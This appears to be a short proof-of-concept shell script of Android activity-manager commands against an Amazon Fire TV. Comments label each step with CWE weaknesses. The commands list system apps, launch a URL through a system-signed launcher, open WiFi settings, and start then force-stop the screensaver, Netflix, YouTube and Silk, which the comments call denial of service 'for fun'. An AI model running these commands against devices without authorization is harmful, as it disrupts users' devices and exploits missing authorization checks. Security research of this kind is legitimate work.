
ls /system/priv-app # Using CWE 862 (Missing Authorization) to list apps signed by [system]

# Using CWE 862 (Missing Authorization), CWE 755 (Improper Handling Of System Disruptions) and CWE 926 (Improper Export Of Android Component)
# to call, then DoS, the screensaver.
am start -p com.amazon.ftv.screensaver
am force-stop com.amazon.ftv.screensaver

# Using CWE 862 (Missing Authorization) and CWE 610 (Externally Controlled Reference To Another Sphere)
# to call the Website Launcher, a system signed app, and pass a URL off to Silk, a normal user app.
am start -a android.intent.action.VIEW -d "https://google.com"

# Just starting, then DoSing some apps for fun...

am start -p com.amazon.cloud9
am force-stop com.amazon.cloud9

am start -p com.netflix.ninja
am force-stop com.netflix.ninja

am start -p com.amazon.firetv.youtube
am force-stop com.amazon.firetv.youtube

# Invoking the WiFi Settings, because... uh, why not?
am start -a android.settings.WIFI_SETTINGS
